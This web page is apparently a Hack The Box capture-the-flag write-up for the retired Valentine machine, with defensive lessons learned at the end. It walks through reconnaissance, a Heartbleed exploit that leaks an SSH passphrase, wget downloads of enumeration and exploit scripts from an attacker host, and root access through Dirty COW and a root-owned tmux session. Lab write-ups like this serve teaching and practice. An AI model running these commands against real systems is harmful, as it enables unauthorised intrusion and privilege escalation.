<!-- Fix MathJax rendering on iOS Safari due to rendering long numbers as phone numbers. -->




<!doctype html>
<html lang="en" class="no-js">
  <head>
    
	
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
        <meta name="description" content="A compilation of writeups for the website- [**https://www.hackthebox.eu/](https://www.hackthebox.eu/**).">
      
      
        <link rel="canonical" href="http://hackthebox-solutions.github.io/Retired/Valentine Writeup wo Metasploit/">
      
      
        <meta name="author" content="Rushi Chaudhari">
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../../assets/favicon.png">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
    
	<meta name="format-detection" content="telephone=no">

    
      
        <title>15. Valentine Writeup w/o Metasploit.md - Hackthebox Solutions</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/application.1b62728e.css">
      
        <link rel="stylesheet" href="../../assets/stylesheets/application-palette.a8b3c06d.css">
      
      
        
        
        <meta name="theme-color" content="#009688">
      
    
    
      <script src="../../assets/javascripts/modernizr.268332fc.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../../css/katex.css">
    
      <link rel="stylesheet" href="../../css/custom.css">
    
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.css">
    
    
      
    
    
  </head>
  
    
    
    <body dir="ltr" data-md-color-primary="teal" data-md-color-accent="blue">
  
    <svg class="md-svg">
      <defs>
        
        
          <svg xmlns="http://www.w3.org/2000/svg" width="416" height="448" viewBox="0 0 416 448" id="__github"><path fill="currentColor" d="M160 304q0 10-3.125 20.5t-10.75 19T128 352t-18.125-8.5-10.75-19T96 304t3.125-20.5 10.75-19T128 256t18.125 8.5 10.75 19T160 304zm160 0q0 10-3.125 20.5t-10.75 19T288 352t-18.125-8.5-10.75-19T256 304t3.125-20.5 10.75-19T288 256t18.125 8.5 10.75 19T320 304zm40 0q0-30-17.25-51T296 232q-10.25 0-48.75 5.25Q229.5 240 208 240t-39.25-2.75Q130.75 232 120 232q-29.5 0-46.75 21T56 304q0 22 8 38.375t20.25 25.75 30.5 15 35 7.375 37.25 1.75h42q20.5 0 37.25-1.75t35-7.375 30.5-15 20.25-25.75T360 304zm56-44q0 51.75-15.25 82.75-9.5 19.25-26.375 33.25t-35.25 21.5-42.5 11.875-42.875 5.5T212 416q-19.5 0-35.5-.75t-36.875-3.125-38.125-7.5-34.25-12.875T37 371.5t-21.5-28.75Q0 312 0 260q0-59.25 34-99-6.75-20.5-6.75-42.5 0-29 12.75-54.5 27 0 47.5 9.875t47.25 30.875Q171.5 96 212 96q37 0 70 8 26.25-20.5 46.75-30.25T376 64q12.75 25.5 12.75 54.5 0 21.75-6.75 42 34 40 34 99.5z"/></svg>
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#reconnaissance" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="http://hackthebox-solutions.github.io" title="Hackthebox Solutions" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              Hackthebox Solutions
            </span>
            <span class="md-header-nav__topic">
              
                15. Valentine Writeup w/o Metasploit.md
              
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
        <div class="md-flex__cell md-flex__cell--shrink">
          <div class="md-header-nav__source">
            


  

<a href="https://github.com/hackthebox-solutions/hackthebox-solutions.github.io/" title="Go to repository" class="md-source" data-md-source="github">
  
    <div class="md-source__icon">
      <svg viewBox="0 0 24 24" width="24" height="24">
        <use xlink:href="#__github" width="24" height="24"></use>
      </svg>
    </div>
  
  <div class="md-source__repository">
    hackthebox-solutions.github.io
  </div>
</a>
          </div>
        </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main" role="main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href="http://hackthebox-solutions.github.io" title="Hackthebox Solutions" class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </a>
    Hackthebox Solutions
  </label>
  
    <div class="md-nav__source">
      


  

<a href="https://github.com/hackthebox-solutions/hackthebox-solutions.github.io/" title="Go to repository" class="md-source" data-md-source="github">
  
    <div class="md-source__icon">
      <svg viewBox="0 0 24 24" width="24" height="24">
        <use xlink:href="#__github" width="24" height="24"></use>
      </svg>
    </div>
  
  <div class="md-source__repository">
    hackthebox-solutions.github.io
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href="../.." title="Preface" class="md-nav__link">
      Preface
    </a>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
    
    <label class="md-nav__link" for="nav-2">
      I Retired
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        I Retired
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../Access Writeup/" title="1. Access Writeup.md" class="md-nav__link">
      1. Access Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Jerry Writeup/" title="2. Jerry Writeup.md" class="md-nav__link">
      2. Jerry Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Blue Writeup wo Metasploit/" title="3. Blue Writeup w/o Metasploit.md" class="md-nav__link">
      3. Blue Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Blocky Writeup/" title="4. Blocky Writeup.md" class="md-nav__link">
      4. Blocky Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Calamity Writeup/" title="5. Calamity Writeup.md" class="md-nav__link">
      5. Calamity Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Devoops Writeup/" title="6. Devoops Writeup.md" class="md-nav__link">
      6. Devoops Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Apocalyst Writeup/" title="7. Apocalyst Writeup.md" class="md-nav__link">
      7. Apocalyst Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Poison Writeup wo Metasploit/" title="8. Poison Writeup w/o Metasploit.md" class="md-nav__link">
      8. Poison Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Postman Writeup/" title="9. Postman Writeup.md" class="md-nav__link">
      9. Postman Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Beep Writeup/" title="10. Beep Writeup.md" class="md-nav__link">
      10. Beep Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Help Writeup/" title="11. Help Writeup.md" class="md-nav__link">
      11. Help Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Mirai Writeup/" title="12. Mirai Writeup.md" class="md-nav__link">
      12. Mirai Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Curling Writeup/" title="13. Curling Writeup.md" class="md-nav__link">
      13. Curling Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Nibbles Writeup wo Metasploit/" title="14. Nibbles Writeup w/o Metasploit.md" class="md-nav__link">
      14. Nibbles Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
      
    
    
    <a href="./" title="15. Valentine Writeup w/o Metasploit.md" class="md-nav__link md-nav__link--active">
      15. Valentine Writeup w/o Metasploit.md
    </a>
    
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Popcorn Writeups/" title="16. Popcorn Writeups.md" class="md-nav__link">
      16. Popcorn Writeups.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Cronos Writeup/" title="17. Cronos Writeup.md" class="md-nav__link">
      17. Cronos Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Legacy Writeup/" title="18. Legacy Writeup.md" class="md-nav__link">
      18. Legacy Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Openadmin Writeup/" title="19. Openadmin Writeup.md" class="md-nav__link">
      19. Openadmin Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Bank Writeup/" title="20. Bank Writeup.md" class="md-nav__link">
      20. Bank Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Shocker Writeup wo Metasploit/" title="21. Shocker Writeup w/o Metasploit.md" class="md-nav__link">
      21. Shocker Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Luke Writeup/" title="22. Luke Writeup.md" class="md-nav__link">
      22. Luke Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Arctic Writeup wo Metasploit/" title="23. Arctic Writeup w/o Metasploit.md" class="md-nav__link">
      23. Arctic Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Granny Writeup/" title="24. Granny Writeup.md" class="md-nav__link">
      24. Granny Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Netmon Writeup/" title="25. Netmon Writeup.md" class="md-nav__link">
      25. Netmon Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Sense Writeup wo Metasploit/" title="26. Sense Writeup w/o Metasploit.md" class="md-nav__link">
      26. Sense Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Sunday Writeup wo Metasploit/" title="27. Sunday Writeup w/o Metasploit.md" class="md-nav__link">
      27. Sunday Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Solidstate Writeup wo Metasploit/" title="28. Solidstate Writeup w/o Metasploit.md" class="md-nav__link">
      28. Solidstate Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Celestial Writeup/" title="29. Celestial Writeup.md" class="md-nav__link">
      29. Celestial Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Tenten Writeup/" title="30. Tenten Writeup.md" class="md-nav__link">
      30. Tenten Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Optimum Writeup/" title="31. Optimum Writeup.md" class="md-nav__link">
      31. Optimum Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Haircut Writeup/" title="32. Haircut Writeup.md" class="md-nav__link">
      32. Haircut Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Irked Writeup/" title="33. Irked Writeup.md" class="md-nav__link">
      33. Irked Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Chatterbox Writeup wo Metasploit/" title="34. Chatterbox Writeup w/o Metasploit.md" class="md-nav__link">
      34. Chatterbox Writeup w/o Metasploit.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Bashed Writeup/" title="35. Bashed Writeup.md" class="md-nav__link">
      35. Bashed Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Lame Writeup/" title="36. Lame Writeup.md" class="md-nav__link">
      36. Lame Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Grandpa Writeup/" title="37. Grandpa Writeup.md" class="md-nav__link">
      37. Grandpa Writeup.md
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../Swagshop Writeup/" title="38. Swagshop Writeup.md" class="md-nav__link">
      38. Swagshop Writeup.md
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/hackthebox-solutions/hackthebox-solutions.github.io/edit/master/docs/Retired/Valentine Writeup wo Metasploit.md" title="Edit this page" class="md-icon md-content__icon">&#xE3C9;</a>
                
                
                <p><img alt="" src="../../img/Valentine Writeup wo Metasploit/1_y9ibWzkz5qcYJHJ4n7T2DA.png" /></p>
<h1 id="reconnaissance">Reconnaissance</h1>
<p>First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nmap -sC -sV -O -oA htb/valentine/nmap/initial 10.10.10.79
</pre></div>

<ul>
<li>
<p><strong>-sC</strong>: run default nmap scripts</p>
</li>
<li>
<p><strong>-sV</strong>: detect service version</p>
</li>
<li>
<p><strong>-O</strong>: detect OS</p>
</li>
<li>
<p><strong>-oA</strong>: output all formats and store in file <em>nmap/initial</em></p>
</li>
</ul>
<p>We get back the following result showing that three ports are open:</p>
<ul>
<li>
<p><strong>Port 22</strong>: running OpenSSH 5.9p1</p>
</li>
<li>
<p><strong>Ports 80 &amp; 443: </strong>running Apache httpd 2.2.22</p>
</li>
</ul>
<p><img alt="" src="../../img/Valentine Writeup wo Metasploit/1_U5tqES-_Zhq-rH7XI6IsIQ.png" /></p>
<p>Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.</p>
<p>Let’s run an nmap scan that covers all ports.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nmap -sC -sV -O -p- -oA htb/valentine/nmap/full 10.10.10.79
</pre></div>

<p>We get back the following result. No other ports are open.</p>
<p><img alt="" src="../../img/Valentine Writeup wo Metasploit/1_LY_UzlHQ5Nbv1Vu2EuqpXQ.png" /></p>
<p>Similarly, we run an nmap scan with the <strong>-sU </strong>flag enabled to run a UDP scan.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nmap -sU -O -p- -oA htb/valentine/nmap/udp 10.10.10.79
</pre></div>

<p>I managed to root the box and write this blog, while this UDP scan still did not terminate. So for this blog, I don’t have the UDP scan results.</p>
<h1 id="enumeration">Enumeration</h1>
<p>Visit the site in the browser.</p>
<p><img alt="" src="../../img/Valentine Writeup wo Metasploit/1_tiRrJBOOEJeDVhN_Plckzw.png" /></p>
<p>It only contains a picture (which is a big indication of the vulnerability we’ll find) and no other links. So we’ll have to run Gobuster.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.79
</pre></div>

<p>We get back the following results.</p>
<p><img alt="" src="../../img/Valentine Writeup wo Metasploit/1_efzWPhYsecqzn_JFpipsMg.png" /></p>
<p>/index, /omg and /server-status lead nowhere. /encode and /decode seem to be scripts that encode and decode strings. /dev on the other hand proves to be interesting.</p>
<p><img alt="" src="../../img/Valentine Writeup wo Metasploit/1_m2IHc2jaf6X25WDex3uFPw.png" /></p>
<p>Click on the hype_key to get the following page.</p>
<p><img alt="" src="../../img/Valentine Writeup wo Metasploit/1_neCI86lS5ymOS98kJd0zPQ.png" /></p>
<p>It contains a string that is hex encoded. Let’s use an <a href="https://conv.darkbyte.ru/">online tool</a> to convert it to text. We find out that it is an RSA private key!</p>
<p><img alt="" src="../../img/Valentine Writeup wo Metasploit/1_dnlWAvC54dhMGUnpgg00Sg.png" /></p>
<p>Take the converted text format and save it into a hype_key file.</p>
<p><strong>Disclaimer:</strong> You should NEVER enter your or anyone else’s credentials in online tools just in case it gets logged at the backend! In this case, it doesn’t matter since this is a fake security assessment.</p>
<p>We’ll try and ssh using our newly found private key. Based on the naming convention of pub/priv keys, “hype” is likely the username.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>ssh -i hype_key hype@10.10.10.79
</pre></div>

<ul>
<li><strong>-i:</strong> Selects a file from which the identity (private key) for RSA authentication is read.</li>
</ul>
<p>I get back the following error.</p>
<p><img alt="" src="../../img/Valentine Writeup wo Metasploit/1_9Pt0cUN3RdmIoh6MDQuVQg.png" /></p>
<p>Since a private key is equivalent to a password, it should only be readable by you. We resolve the error using the following command.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>chmod 400 hype_key
</pre></div>

<p>However, we are prompted for a password that we still don’t have and so we need to do more enumeration.</p>
<p>Run nmap’s vulnerability scan script to determine if any of the services are vulnerable.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>nmap --script vuln -oA vuln-scan 10.10.10.79
</pre></div>

<p><img alt="" src="../../img/Valentine Writeup wo Metasploit/1_wKyVdJiL061zPoV4xU-Fwg.png" /></p>
<p>Port 443 is running a version of OpenSSL that is vulnerable to Heartbleed!</p>
<p>If you don’t know what that is, here’s a <a href="https://xkcd.com/1354/">great comic </a>explaining it. It is essentially a vulnerability in the popular OpenSSL cryptographic software library. This vulnerability allows anyone on the Internet to read the memory of the systems protected by this vulnerable version of OpenSSL. This can lead to the compromise of secret keys, passwords, information, etc. It also allows attackers to eavesdrop on communications. There’s a whole site dedicated to the <a href="http://heartbleed.com/">Hearbleed bug</a>.</p>
<h1 id="gaining-an-initial-foothold">Gaining an Initial Foothold</h1>
<p>Now that we know for sure that port 443 is running a vulnerable version of OpenSSL, let’s try and exploit it to gain an initial foothold on the target machine.</p>
<p>First, get the exploit from <a href="https://gist.github.com/eelsivart/10174134#file-heartbleed-py-L8">online</a> and clone it.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>git clone [https://gist.github.com/10174134.git](https://gist.github.com/10174134.git)
</pre></div>

<p>Run the script to view the help instructions.</p>
<p><img alt="" src="../../img/Valentine Writeup wo Metasploit/1_ryj0WqqLxw5hTPGFqt7ZxQ.png" /></p>
<p>Let’s run the exploit with a loop number of 10. We might have to run the script multiple times or increase the loop size depending on how useful the content of the memory dump is.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>python heartbleed.py -p 443 -n 10 10.10.10.79
</pre></div>

<p>We’re looking for hype’s passphrase so that we could SSH into his account.</p>
<p>After rummaging through the memory dump, we find the following strings.</p>
<p><img alt="" src="../../img/Valentine Writeup wo Metasploit/1_a2J8Vy4DQgirDztc2Onz7A.png" /></p>
<p>Someone used the decode.php script on the website to decode a string of characters. Copy the string and use the site to decode it.</p>
<p><img alt="" src="../../img/Valentine Writeup wo Metasploit/1_Wy6UX9qQr8bUFr1FPyQD3Q.png" /></p>
<p>This looks like a password! Let’s use it to ssh into hype’s account.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>ssh -i hype_key hype@10.10.10.79
</pre></div>

<p>We have a low privileged shell!</p>
<p><img alt="" src="../../img/Valentine Writeup wo Metasploit/1_Ab0JppTOQT15QzzOTzbqgw.png" /></p>
<p>Grab the user flag.</p>
<p><img alt="" src="../../img/Valentine Writeup wo Metasploit/1_F59vVNSi-MfvvrMczOuSgw.png" /></p>
<p>We need to escalate privileges.</p>
<h1 id="privilege-escalation">Privilege Escalation</h1>
<p>Grab the <a href="https://github.com/rebootuser/LinEnum">LinEnum</a> script if you don’t already have it. In the attack machine, start up a server in the directory that the script resides in.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>python -m SimpleHTTPServer 5555
</pre></div>

<p>In the target machine download the script.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>wget [http://10.10.14.6:5555/LinEnum.sh](http://10.10.14.6:5555/LinEnum.sh)
</pre></div>

<p>Run the script.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>./LinEnum.sh
</pre></div>

<p>We get back many results of which two are interesting.</p>
<p>First, it’s running an old version of Ubuntu that is probably vulnerable to <a href="https://dirtycow.ninja/">Dirty COW</a>. Dirty COW is a privilege escalation vulnerability which exploits a race condition in the way the Linux kernel’s memory subsystem handles the copy-on-write (COW) breakage of private read-only memory mappings.</p>
<p><img alt="" src="../../img/Valentine Writeup wo Metasploit/1_BrazHc5GyWfr26QOvRJlaA.png" /></p>
<p>Second, there’s an active tmux session that is owned by root.</p>
<p><img alt="" src="../../img/Valentine Writeup wo Metasploit/1_XfFIN0eDDp1hhhxhygwlrQ.png" /></p>
<p>According to the <a href="http://man7.org/linux/man-pages/man1/tmux.1.html">tmux man page</a>:</p>
<blockquote>
<p>tmux is a terminal multiplexer: it enables a number of terminals to be
created, accessed, and controlled from a single screen.</p>
</blockquote>
<p>It’s essentially a shell that is owned by root! So if we can enter this active tmux session, any command we run there is executed with root privileges. This one I didn’t figure out on my own, I had to use<a href="https://www.youtube.com/watch?v=XYXNvemgJUo"> ippsec’s help</a>.</p>
<p>Alright, so we have two ways of escalating privileges.</p>
<p><strong>Privilege Escalation #1: Dirty COW Vulnerability</strong></p>
<p>To confirm that the target machine is vulnerable to Dirty COW, download the <a href="https://github.com/jondonas/linux-exploit-suggester-2">Linux Exploit Suggester</a> script. In the attack machine, start up a server in the directory where the script resides.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>python -m SimpleHTTPServer 5555
</pre></div>

<p>Download the exploit on your target machine.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>wget [http://10.10.14.6:5555/linux-exploit-suggester-2.pl](http://10.10.14.6:5555/linux-exploit-suggester-2.pl)
</pre></div>

<p>Run the script.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>./linux-exploit-suggester-2.pl
</pre></div>

<p>We confirm that it is vulnerable to Dirty COW.</p>
<p><img alt="" src="../../img/Valentine Writeup wo Metasploit/1_lfHXPU0KmXSl9DwXO72y0w.png" /></p>
<p>I tried several of the exploits on this <a href="https://dirtycow.ninja/">page</a> but they didn’t work. Therefore, I ended up using this <a href="https://github.com/FireFart/dirtycow/blob/master/dirty.c">exploit</a>.</p>
<p>Clone the exploit on the attack machine.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>git clone [https://gist.github.com/e9d4ff65d703a9084e85fa9df083c679.git](https://gist.github.com/e9d4ff65d703a9084e85fa9df083c679.git)
</pre></div>

<p>Start up a server in the directory where the exploit resides.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>python -m SimpleHTTPServer 5555
</pre></div>

<p>Transfer the exploit to the target machine.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>wget [http://10.10.14.6:5555/dirty.c](http://10.10.14.6:5555/dirty.c)
</pre></div>

<p>Compile the file as per the included compile instructions.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>gcc -pthread dirty.c -o dirty -lcrypt
</pre></div>

<p>Run the exploit.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>./dirty
</pre></div>

<p>Choose the password for the newly created user.</p>
<p><img alt="" src="../../img/Valentine Writeup wo Metasploit/1_wdOtAeCiuFtOwRoxEErCzQ.png" /></p>
<p>Change to the newly created user.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>su firefart
</pre></div>

<p>We have root privileges! Grab the root flag.</p>
<p><img alt="" src="../../img/Valentine Writeup wo Metasploit/1_DyoXBLgZIQZPxj3VN4I_0g.png" /></p>
<p><strong>Privilege Escalation #2: Attach to Root Owned tmux Session</strong></p>
<p>In the target machine, attach to the tmux shell using the following command.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>tmux -S /.devs/dev_sess
</pre></div>

<p><img alt="" src="../../img/Valentine Writeup wo Metasploit/1_OTAZRai6ctSreIOWA87Ccg.png" /></p>
<p>Since this is a session owned by root, we have root privileges!</p>
<h1 id="lessons-learned">Lessons Learned</h1>
<p>To gain an initial foothold on the target machine we required two pieces of information: (1) the private key and (2) the passphrase to ssh into a user’s account. We got the private key by enumerating the directories and files that are available on the web server. As for the passphrase we exploited the Heartbleed bug in the vulnerable OpenSSL version used on the target machine.</p>
<p>Getting the private key could have been avoided if the user did not publish his credentials on a public web server. As for the passphrase, this could have been avoided if the patched version of OpenSSL was installed.</p>
<p>To escalate to root privileges we had two options: (1) exploit the Dirty COW vulnerability, or (2) attach to a tmux session that was owned by root.</p>
<p>Exploiting Dirty COW could have been avoided if the target machine was patched. As for the tmux privilege escalation, I’m not entirely sure that it is a vulnerability (and I stand to be corrected). It seems to be an intended functionality of tmux that allows any user on the box to attach to any session opened on that box. Precautions can be taken by (1) not running your tmux session as root and using sudo within the tmux session if you need root privileges, and (2) closing the tmux session once you’re done instead of having it run (and accessible) the entire time.</p>
<h1 id="conclusion">Conclusion</h1>
<p>8 machines down, 33 more to go</p>
<p><img alt="" src="../../img/Valentine Writeup wo Metasploit/1__Qw4Qz8x7fllY3rrNYTrvw.png" /></p>
                
                  
                
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../Nibbles Writeup wo Metasploit/" title="14. Nibbles Writeup w/o Metasploit.md" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                14. Nibbles Writeup w/o Metasploit.md
              </span>
            </div>
          </a>
        
        
          <a href="../Popcorn Writeups/" title="16. Popcorn Writeups.md" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                16. Popcorn Writeups.md
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            Built by <a href="http://github.com/rushic24">Rushi</a> &copy; 2020
          </div>
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
  <div class="md-footer-social">
    <link rel="stylesheet" href="../../assets/fonts/font-awesome.css">
    
      <a href="https://github.com/rushic24" class="md-footer-social__link fa fa-"></a>
    
